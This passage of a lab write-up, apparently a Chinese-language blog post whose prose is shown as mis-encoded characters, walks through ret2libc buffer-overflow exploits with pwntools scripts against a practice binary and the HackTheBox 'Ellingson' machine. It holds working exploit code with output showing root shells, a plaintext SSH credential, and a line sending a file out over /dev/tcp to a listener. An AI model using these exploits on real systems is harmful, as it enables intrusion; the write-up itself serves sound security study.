from pwn import *
e = ELF('./ret2libc3')
sh = process('./ret2libc3')
puts_plt_addr = e.plt['puts']
libc_start_main_got_addr = e.got['__libc_start_main']
main_addr = e.symbols['main']

print('æ³„éœ² libc_start_main_got_addr å¹¶è¿”å›åˆ° main')
payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)
sh.sendlineafter(b'Can you find it !?',payload1)
libc_start_main_real_addr = u32(sh.recv()[0:4])
print(f"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}")
```

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image20.png)

å†ä¸‹ä¸€æ­¥æˆ‘ä»¬è¦å¾—åˆ° `libc`ç‰ˆæœ¬å’ŒåŸºåœ°å€ä»¥åŠ`system` å‡½æ•°å’Œ`/bin/sh`å­—ç¬¦ä¸²çš„åœ°å€

```bash
from pwn import *
from LibcSearcher import *
e = ELF('./ret2libc3')
sh = process('./ret2libc3')
puts_plt_addr = e.plt['puts']
libc_start_main_got_addr = e.got['__libc_start_main']
main_addr = e.symbols['main']

print('æ³„éœ² libc_start_main_got_addr å¹¶è¿”å›åˆ° main')
payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)
sh.sendlineafter(b'Can you find it !?',payload1)
libc_start_main_real_addr = u32(sh.recv()[0:4])
print(f"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}")

print('å¾—åˆ° libc ç‰ˆæœ¬ï¼Œå¹¶è®¡ç®—åŸºåœ°å€å’Œ system & /bin/sh åœ°å€')
libc = LibcSearcher("__libc_start_main", libc_start_main_real_addr)
libcbase = libc_start_main_real_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
bin_sh_addr = libcbase + libc.dump('/bin/sh')
print(f'åŸºåœ°å€:{libcbase},systemåœ°å€:{system_addr},/bin/shåœ°å€:{bin_sh_addr}')
```

è¿™é‡Œåæ§½ä¸€ä¸‹`LibcSearcher` ï¼Œä¸€ç›´æç¤º`[+] No libc satisfies constraints.` è²Œä¼¼`fork`å¤ªä¹…è¿œäº†æ²¡æ›´æ–°

è¿™é‡Œç›´æ¥é“¾æ¥æœ¬åœ°çš„`libc`åº“äº†ï¼Œä¸ä½¿ç”¨`LibcSearcher`

```bash
from pwn import *
e = ELF('./ret2libc3')
libc = ELF("/lib32/libc.so.6")
sh = process('./ret2libc3')
puts_plt_addr = e.plt['puts']
libc_start_main_got_addr = e.got['__libc_start_main']
main_addr = e.symbols['main']

print('æ³„éœ² libc_start_main_got_addr å¹¶è¿”å›åˆ° main')
payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)
sh.sendlineafter(b'Can you find it !?',payload1)
libc_start_main_real_addr = u32(sh.recv()[0:4])
print(f"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}")

print('è®¡ç®—åŸºåœ°å€å’Œ system & /bin/sh åœ°å€')
libcbase = libc_start_main_real_addr - libc.sym['__libc_start_main']
system_addr = libcbase + libc.sym['system']
bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
print(f'åŸºåœ°å€:{hex(libcbase)},systemåœ°å€:{hex(system_addr)},/bin/shåœ°å€:{hex(bin_sh_addr)}')
```

æ‰€æœ‰å‚æ•°æˆ‘ä»¬éƒ½æœ‰äº†ï¼Œå°±å¯ä»¥æ„é€ `payload`äº†

1. æ–¹æ¡ˆ `1`ï¼ˆè¿™é‡Œä»¿ç…§`wiki`ä¸Šçš„å†™ï¼‰ï¼š
    
    ```bash
    from pwn import *
    e = ELF('./ret2libc3')
    p = process('./ret2libc3')
    libc = ELF('/lib32/libc.so.6')
    
    puts_plt_addr = e.plt['puts']
    libc_start_main_addr = e.got['__libc_start_main']
    main_addr = e.symbols['main']
    payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_addr)
    p.sendlineafter("Can you find it !?", payload1)
    libc_start_main_real_addr = u32(p.recv()[0:4])
    print(f"libc_start_main_real_addr = {hex(libc_start_main_real_addr)}")
    
    libcbase = libc_start_main_real_addr - libc.sym['__libc_start_main']
    print(f"libcbase = {hex(libcbase)}")
    system_real_addr = libcbase + libc.sym['system']
    print(f"system_real_addr = {hex(system_real_addr)}")
    bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
    print(f"bin_sh_addr = {hex(bin_sh_addr)}")
    payload2 = b'A' * 104+ p32(system_real_addr) + b'A' * 4 + p32(bin_sh_addr)
    p.sendline(payload2)
    p.interactive()
    ```
    
    è¾“å‡ºï¼ˆå¤±è´¥äº†ï¼‰ï¼š
    
    ```bash
    (pwn) âœ  ret2libc python exp.py
    [*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'
        Arch:       i386-32-little
        RELRO:      Partial RELRO
        Stack:      No canary found
        NX:         NX enabled
        PIE:        No PIE (0x8048000)
        Stripped:   No
        Debuginfo:  Yes
    [+] Starting local process './ret2libc3': pid 4574
    [*] '/lib32/libc.so.6'
        Arch:       i386-32-little
        RELRO:      Full RELRO
        Stack:      Canary found
        NX:         NX enabled
        PIE:        PIE enabled
    /root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      res = self.recvuntil(delim, timeout=timeout)
    libc_start_main_real_addr = 0x206f4e0a
    libcbase = 0x206d010a
    system_real_addr = 0x2072232a
    bin_sh_addr = 0x20896f5c
    [*] Switching to interactive mode
    [*] Got EOF while reading in interactive
    $ id
    [*] Process './ret2libc3' stopped with exit code -11 (SIGSEGV) (pid 4574)
    [*] Got EOF while sending in interactive
    ```
    
2. æ–¹æ¡ˆ 2ï¼ˆå¤§ä½¬é€šè¿‡`puts`è€Œä¸æ˜¯`libc_start_main` ï¼Œå¹¶ä¸”äºŒæ¬¡è¿”å›åˆ°çš„æ›´æ—©ä¹‹å‰ï¼‰ï¼š
    
    ```bash
    from pwn import *
    e = ELF('./ret2libc3')
    p = process('./ret2libc3')
    libc = ELF('/lib32/libc.so.6')
    
    puts_plt_addr = e.plt['puts']
    puts_got_addr = e.got['puts']
    main_addr = e.symbols['_start']
    payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(puts_got_addr)
    p.sendlineafter("Can you find it !?", payload1)
    puts_real_addr = u32(p.recv()[0:4])
    print(f"puts_real_addr = {hex(puts_real_addr)}")
    
    libcbase = puts_real_addr - libc.sym['puts']
    print(f"libcbase = {hex(libcbase)}")
    system_real_addr = libcbase + libc.sym['system']
    print(f"system_real_addr = {hex(system_real_addr)}")
    bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
    print(f"bin_sh_addr = {hex(bin_sh_addr)}")
    payload2 = b'A' * 112 + p32(system_real_addr) + b'A' * 4 + p32(bin_sh_addr)
    p.sendline(payload2)
    p.interactive()
    ```
    
    è¾“å‡ºï¼ˆæˆåŠŸï¼‰ï¼š
    
    ```bash
    (pwn) âœ  ret2libc python exp.py
    [*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'
        Arch:       i386-32-little
        RELRO:      Partial RELRO
        Stack:      No canary found
        NX:         NX enabled
        PIE:        No PIE (0x8048000)
        Stripped:   No
        Debuginfo:  Yes
    [+] Starting local process './ret2libc3': pid 4630
    [*] '/lib32/libc.so.6'
        Arch:       i386-32-little
        RELRO:      Full RELRO
        Stack:      Canary found
        NX:         NX enabled
        PIE:        PIE enabled
    /root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      res = self.recvuntil(delim, timeout=timeout)
    puts_real_addr = 0xf7da72a0
    libcbase = 0xf7d2b000
    system_real_addr = 0xf7d7d220
    bin_sh_addr = 0xf7ef1e52
    [*] Switching to interactive mode
    $ id
    uid=0(root) gid=0(root) ç»„=0(root)
    ```
    
3. æ–¹æ¡ˆ3ï¼Œä¿®å¤`wiki`ä¸Šçš„æ–¹æ¡ˆ
    
    ä¸ä½¿ç”¨`__libc_start_main` æ¥è·å–ç¬¬ä¸€ä¸ªçœŸå®åœ°å€ï¼Œè€Œä½¿ç”¨`puts`
    
    ```bash
    (pwn) âœ  ret2libc cat exp.py
    from pwn import *
    e = ELF('./ret2libc3')
    p = process('./ret2libc3')
    libc = ELF('/lib32/libc.so.6')
    
    puts_plt_addr = e.plt['puts']
    libc_start_main_addr = e.got['puts']
    main_addr = e.symbols['main']
    payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_addr)
    p.sendlineafter("Can you find it !?", payload1)
    libc_start_main_real_addr = u32(p.recv()[0:4])
    print(f"libc_start_main_real_addr = {hex(libc_start_main_real_addr)}")
    
    libcbase = libc_start_main_real_addr - libc.sym['puts']
    print(f"libcbase = {hex(libcbase)}")
    system_real_addr = libcbase + libc.sym['system']
    print(f"system_real_addr = {hex(system_real_addr)}")
    bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
    print(f"bin_sh_addr = {hex(bin_sh_addr)}")
    payload2 = b'A' * 104+ p32(system_real_addr) + b'A' * 4 + p32(bin_sh_addr)
    p.sendline(payload2)
    p.interactive()
    ```
    
    è¾“å‡ºï¼ˆæˆåŠŸï¼‰
    
    ```bash
    (pwn) âœ  ret2libc python exp.py
    [*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'
        Arch:       i386-32-little
        RELRO:      Partial RELRO
        Stack:      No canary found
        NX:         NX enabled
        PIE:        No PIE (0x8048000)
        Stripped:   No
        Debuginfo:  Yes
    [+] Starting local process './ret2libc3': pid 6021
    [*] '/lib32/libc.so.6'
        Arch:       i386-32-little
        RELRO:      Full RELRO
        Stack:      Canary found
        NX:         NX enabled
        PIE:        PIE enabled
    /root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      res = self.recvuntil(delim, timeout=timeout)
    libc_start_main_real_addr = 0xf7d902a0
    libcbase = 0xf7d14000
    system_real_addr = 0xf7d66220
    bin_sh_addr = 0xf7edae52
    [*] Switching to interactive mode
    $ id
    uid=0(root) gid=0(root) ç»„=0(root)
    ```
    
    ä¸ºä»€ä¹ˆç¬¬äºŒæ¬¡è°ƒç”¨æ—¶ä½¿ç”¨`104`æ¥å¡«å……æ ˆè€Œä¸æ˜¯`112`ï¼Ÿ
    
    å› ä¸ºç¨‹åºçœŸæ­£çš„å…¥å£æ˜¯`_start`ï¼Œè€Œä¸æ˜¯`main` ï¼Œæˆ‘ä»¬æ¥çœ‹`_start`
    
    ![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image21.png)
    
    è°ƒç”¨`main`å‰ä¼šå…ˆè°ƒç”¨`and     esp, 0FFFFFFF0h` æ¥ä½¿å †æ ˆå¹³è¡¡
    
    å¯ä»¥åœ¨ `_start` å¤„æ–­ç‚¹ï¼Œç„¶å`si`æ¥ä¸€æ­¥ä¸€æ­¥è°ƒè¯•æŸ¥çœ‹ `esp` çš„å˜åŒ–
    
    ç¬¬ä¸€æ¬¡æˆ‘ä»¬è¿è¡Œ`payload1`çš„æ—¶å€™æ˜¯ç›´æ¥ä»`_start`å¼€å§‹è¿è¡Œçš„ï¼Œä¼šç»è¿‡`and     esp, 0FFFFFFF0h` ä½¿å †æ ˆå¹³è¡¡ï¼Œä½¿æ ˆ `+8` å¾—åˆ°`112` ï¼Œä½†æ˜¯æˆ‘ä»¬ç¬¬äºŒæ¬¡æ‰§è¡Œ`payload2`ä¸æ˜¯ä»`_start`å¼€å§‹ï¼Œç›´æ¥ä»`main`å¼€å§‹ï¼Œ`and`ä¸æ‰§è¡Œï¼Œæ‰€ä»¥æ²¡æœ‰`+8` ï¼Œæ‰€ä»¥æ­¤æ—¶espåˆ°è¦†ç›–è¿”å›åœ°å€ä¸º`112-8=104`
    
    > https://xz.aliyun.com/news/14087
    > 
    
    ä¹Ÿå¯ä»¥è¯´ç¬¬ä¸€æ¬¡è¿è¡Œ `_start` + `main` ä¸€å…± `112` ï¼Œè€Œç¬¬äºŒæ¬¡ç›´æ¥ä»`main`å¼€å§‹ä¸€å…±ç”¨äº†`104`
    

### æ–¹æ¡ˆ`1`å¤±è´¥çš„åŸå› æ˜¯

æ³„éœ²çš„åœ°å€ä¸æ­£ç¡®ï¼ˆåå­—ç¬¦é—®é¢˜ï¼‰

`libc_start_main_real_addr`Â çš„å€¼æ˜¯Â `0x206f4e0a`ã€‚`puts`Â å‡½æ•°æ˜¯ç”¨æ¥æ‰“å°å­—ç¬¦ä¸²çš„ï¼Œå®ƒé‡åˆ°Â `\n`Â (`0x0a`) å°±ä¼šåœæ­¢è¯»å–å¹¶è¾“å‡ºæ¢è¡Œç¬¦ï¼Œç„¶åè¿”å›ã€‚çœ‹ä¸€ä¸‹è¿™ä¸ªåœ°å€Â `0x206f4e0a`ï¼Œå®ƒçš„æœ€åä¸€ä¸ªå­—èŠ‚æ˜¯Â `0a`ï¼Œä¹Ÿå°±æ˜¯æ¢è¡Œç¬¦Â `\n`ã€‚è¿™å°±å¯¼è‡´è§£åŒ…å‡ºæ¥çš„Â `libc_start_main_real_addr`Â æ˜¯ä¸€ä¸ªå®Œå…¨é”™è¯¯çš„å€¼Â `0x206f4e0a`


### ret2libc - x64

æ¥è‡ª `HackTheBox - Ellingson` 

è¿è¡Œå®ƒçš„æ—¶å€™ï¼Œä¼šè®©ä½ è¾“å…¥å¯†ç 

```bash
margo@ellingson:~$ garbage
Enter access password: 111111111111111111111111111111111111111111111111111111

access denied.
```

æ‹‰å‡ºå»é€†å‘çœ‹ä¸€çœ¼

```bash
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+8h] [rbp-8h] BYREF
  unsigned int v4; // [rsp+Ch] [rbp-4h]

  v4 = check_user(argc, argv, envp);
  set_username(v4);
  if ( !(unsigned int)auth(v4) )
    exit(-1);
  puts("[+] W0rM || Control Application");
  puts("[+] ---------------------------");
  puts("Select Option");
  puts("1: Check Balance");
  puts("2: Launch");
  puts("3: Cancel");
  puts("4: Exit");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        printf("> ");
        __isoc99_scanf("%d%*c", &v3);
        if ( v3 != 2 )
          break;
        launch();
      }
      if ( v3 > 2 )
        break;
      if ( v3 != 1 )
        goto LABEL_14;
      checkbalance();
    }
    if ( v3 != 3 )
    {
      if ( v3 == 4 )
        exit(0);
LABEL_14:
      puts("Unknown option");
      exit(-1);
    }
    cancel();
  }
}
```

æˆ‘ä»¬åœ¨å¼€å§‹è¿è¡Œçš„ `auth` å‡½æ•°ä¸­å‘ç°äº†å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´

ä¹Ÿå°±æ˜¯è®©æˆ‘ä»¬è¾“å…¥å¯†ç çš„åœ°æ–¹ï¼Œä¼šæœ‰ç¼“å†²åŒºæº¢å‡ºï¼Œ`gets()` å‡½æ•°ä¼šæ— é™åˆ¶åœ°è¯»å–ç”¨æˆ·çš„è¾“å…¥ï¼Œç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ã€‚å¦‚æœæ”»å‡»è€…è¾“å…¥ä¸€ä¸ªè¶…é•¿çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚`200`ä¸ªå­—ç¬¦ï¼‰ï¼Œå¤šå‡ºæ¥çš„`100`ä¸ªå­—ç¬¦å°±ä¼šæº¢å‡ºï¼Œè¦†ç›–æ‰æ ˆä¸Š `s1` ç›¸é‚»çš„å…¶ä»–æ•°æ®ã€‚

```bash
__int64 __fastcall auth(int a1)
{
  char dest[112]; // [rsp+10h] [rbp-F0h] BYREF
  char s1[100]; // [rsp+80h] [rbp-80h] BYREF
  char v4[12]; // [rsp+E4h] [rbp-1Ch] BYREF
  int v5; // [rsp+F0h] [rbp-10h]

  v5 = a1;
  strcpy(v4, username);
  printf("Enter access password: ");
  gets(s1);
  putchar(10);
  if ( !strcmp(s1, "N3veRF3@r1iSh3r3!") )
  {
    strcpy(dest, "access granted for user: ");
    strcat(dest, v4);
    syslog(6, dest);
    puts("access granted.");
    return 1LL;
  }
  else
  {
    puts("access denied.");
    return 0LL;
  }
}
```

`64`ä½ç¨‹åº

```bash
âœ  Ellingson file garbage 
garbage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped
```

ä¿æŠ¤æªæ–½æƒ…å†µï¼Œå¼€å¯äº†`NX` 

```bash
âœ  Ellingson checksec garbage 
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.13/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.14.1)
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

æ£€æŸ¥ä¸€ä¸‹æ˜¯å¦å¼€å¯äº† `ALSR` ï¼Œå¼€å¯äº†å®Œå…¨`ALSR`

```bash
margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space
2
```

è¿™é‡Œè¦ä½¿ç”¨ `ret2libc` æ”»å‡»

å¯»æ‰¾ä¸€ä¸ªçœŸå®çš„åœ°å€ï¼Œé¦–å…ˆæˆ‘ä»¬æŸ¥çœ‹`libc`æ–‡ä»¶

```bash
margo@ellingson:~$ ldd /usr/bin/garbage 
        linux-vdso.so.1 (0x00007ffcd37ec000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff0364b2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ff0368a3000)
```

å°†`/lib/x86_64-linux-gnu/libc.so.6`ä¸‹è½½åˆ°é¶æœºä¸­

```bash
// kali
âœ  Ellingson nc -lvp 1234 > libc.so.6
// Machine
margo@ellingson:~$ cat /lib/x86_64-linux-gnu/libc.so.6 > /dev/tcp/your-ip/1234
```

é¦–å…ˆåˆ¤æ–­å¡«å……å€¼ï¼Œè¿™é‡Œä½¿ç”¨`garbage` 

```bash
(pwn) âœ  Ellingson pwndbg garbage 
pwndbg> cyclic 1024
aaaabaaacaaadaaa...acwaacxaacyaac
pwndbg> run
Starting program: /root/Desktop/HackTheBox/Ellingson/garbage 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter access password:aaaabaaacaaadaaa...acwaacxaacyaac
```

ç¨‹åºæœä¸å…¶ç„¶å´©æºƒäº†

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image22.png)

è®¡ç®—åç§»å€¼ï¼Œè¿™é‡Œä½¿ç”¨`msf`

```bash
âœ  Ellingson /usr/bin/msf-pattern_create -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image23.png)

```bash
pwndbg> x/xg 0x7fffffffdf58
0x7fffffffdf58: 0x3765413665413565
```

```bash
(pwn) âœ  Ellingson /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        
[*] Exact match at offset 136
```

å¾—åˆ°åç§»å€¼`136` ï¼ˆPSï¼šè¿™é‡Œä½¿ç”¨`pwndbg`çš„`cyclic`æ— æ³•å¾—åˆ°æ­£ç¡®åç§»å€¼ï¼Œä½†æ˜¯`WP`ä¸­ä½¿ç”¨`gef`ç­‰éƒ½å¯ä»¥å¾ˆå®¹æ˜“å°±å¾—åˆ°åç§»å€¼ï¼‰

å¾—åˆ°åç§»å€¼åï¼Œæˆ‘ä»¬é€‰æ‹©ä¸€ä¸‹è·å¾—å“ªä¸ª`plt`å‡½æ•°çš„çœŸå®åœ°å€

```bash
pwndbg> plt
Section .plt 0x401020 - 0x401170:
0x401030: putchar@plt
0x401040: strcpy@plt
0x401050: puts@plt
0x401060: fclose@plt
0x401070: getpwuid@plt
0x401080: getuid@plt
0x401090: printf@plt
0x4010a0: rewind@plt
0x4010b0: fgetc@plt
0x4010c0: read@plt
0x4010d0: fgets@plt
0x4010e0: strcmp@plt
0x4010f0: getchar@plt
0x401100: gets@plt
0x401110: syslog@plt
0x401120: access@plt
0x401130: fopen@plt
0x401140: __isoc99_scanf@plt
0x401150: strcat@plt
0x401160: exit@plt
```

`x64` ä¼ å‚éœ€è¦ä½¿ç”¨å¯„å­˜å™¨ï¼Œ`0x000000000040179b` ç¬¦åˆ

```bash
(pwn) âœ  Ellingson ROPgadget --binary garbage --only "pop|ret"
Gadgets information
============================================================
0x0000000000401794 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401796 : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401798 : pop r14 ; pop r15 ; ret
0x000000000040179a : pop r15 ; ret
0x0000000000401793 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401797 : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401239 : pop rbp ; ret
0x000000000040179b : pop rdi ; ret
0x0000000000401799 : pop rsi ; pop r15 ; ret
0x0000000000401795 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401016 : ret
0x0000000000401072 : ret 0x2f
0x000000000040153a : ret 0x4864
0x0000000000401485 : ret 0x8d48
0x00000000004012ce : ret 0xd089

Unique gadgets found: 15
```

è¿™é‡Œé€‰æ‹©è·å¾—`puts@plt` ï¼Œæˆ‘ä»¬é€šè¿‡`pwn`è¿æ¥`ssh` æ¥è°ƒè¯•

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_add = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_add:{hex(puts_real_add)}")
```

è¿è¡Œåæˆ‘ä»¬çš„å¾—åˆ°äº†`put`çš„çœŸå®åœ°å€`0x7f8eed3569c0`

```bash
(pwn) âœ  Ellingson python exp.py                              
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 21277
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_add = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_add:0x7f8eed3569c0
```

å¾—åˆ°åŸºåœ°å€ï¼ŒåŸºåœ°å€ = puts å‡½æ•°çœŸå®åœ°å€ - puts å‡½æ•°åç§»åœ°å€

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")
```

```bash
(pwn) âœ  Ellingson python exp.py
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 21460
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_addr:0x7f7ed83509c0
libcbase:0x7f7ed82d0000
```

è·å¾—å…¶ä»–åœ°å€ï¼Œå¾—åˆ°åŸºåœ°å€åï¼Œæˆ‘ä»¬è¦å¾—åˆ° `system` å’Œ `/bin/sh`çš„åœ°å€

å‡½æ•°çœŸå®åœ°å€ = åŸºåœ°å€ + å‡½æ•°åç§»å€¼

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")

system_addr = libcbase + libc.sym['system']
print(f"system_addr:{hex(system_addr)}")

bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
print(f"bin_sh_addr = {hex(bin_sh_addr)}")
```

```bash
(pwn) âœ  Ellingson python exp.py
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 21644
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_addr:0x7f41e478b9c0
libcbase:0x7f41e470b000
system_addr:0x7f41e475a440
bin_sh_addr = 0x7f41e48bee9a/3
```

`GetShell` ï¼Œå¾—åˆ°éœ€è¦çš„åœ°å€åï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œè·å–`Shell`äº†

å†æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ª`ret`æ¥å®ç°å †æ ˆå¹³è¡¡

```bash
(pwn) âœ  Ellingson ROPgadget --binary garbage --only "ret"    
Gadgets information
============================================================
0x0000000000401016 : ret
0x0000000000401072 : ret 0x2f
0x000000000040153a : ret 0x4864
0x0000000000401485 : ret 0x8d48
0x00000000004012ce : ret 0xd089
```

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")

system_addr = libcbase + libc.sym['system']
print(f"system_addr:{hex(system_addr)}")

bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
